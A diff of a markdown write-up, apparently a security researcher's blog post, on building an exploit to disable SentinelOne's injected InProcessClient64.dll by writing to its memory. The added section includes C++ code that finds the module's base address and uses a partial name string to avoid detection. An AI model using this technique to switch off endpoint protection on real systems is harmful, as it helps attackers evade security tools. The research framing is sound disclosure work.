@@ -68,7 +68,43 @@ start             end                 module name
 
 <hr/>
 
-## What exactly does InProcessClient64.dll do?
+## But what exactly is InProcessClient64.dll doing?
 I don't really know. A lot. Fortunately, developing this exploit did not require a deep understanding of how the DLL works or how it fits into the complex S1 platform, just that certain functions in the DLL are called at certain times. This was enough to give me an idea on how to approach exploiting it.
 
 <hr/>
+
+## What was the idea?
+The idea was that if I could write to the DLL's memory, maybe I could influence its behavior (i.e. disable it).
+
+To be able to write to memory, the first task was to locate the base address of `InProcessClient64.dll`. Due to ASLR, this address will be different on every system, and after every reboot. I created a C++ console app in Visual Studio whose sole purpose (for now) is to attack the `InProcessClient64.dll` that gets injected into it when the process is created.
+
+Using a combination of Windows APIs including `OpenProcess()`, `EnumProcessModules()`, `GetModuleInformation()`, and `GetModuleFileNameExA()`, it is possible to loop through the loaded modules in your process to look for one in particular.
+
+Here is the code that loops through the loaded modules and looks for the one we're interested in. Note that I am not using the DLL's full name, which is probably not necessary, but is less likely to be seen as malicious if S1 happens to be watching for something like this.
+
+```c
+    HMODULE hModules[1024];
+    DWORD cbNeeded = 0;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
+
+    if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded))
+    {
+        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i)
+        {
+            MODULEINFO modInfo = { 0 };
+            if (GetModuleInformation(hProcess, hModules[i], &modInfo, sizeof(MODULEINFO)))
+            {
+                CHAR modName[MAX_PATH] = { 0 };
+                if (GetModuleFileNameExA(hProcess, hModules[i], modName, sizeof(modName) / sizeof(CHAR)))
+                {
+                    if (std::string(modName).find("cessClient6") != std::string::npos)
+                    {
+                        // we have found the InProcessClient64.dll module, so now we can grab its base address
+
+                        QWORD base = (QWORD)modInfo.lpBaseOfDll;
+                    }
+                }
+            }
+        }
+    }
+```
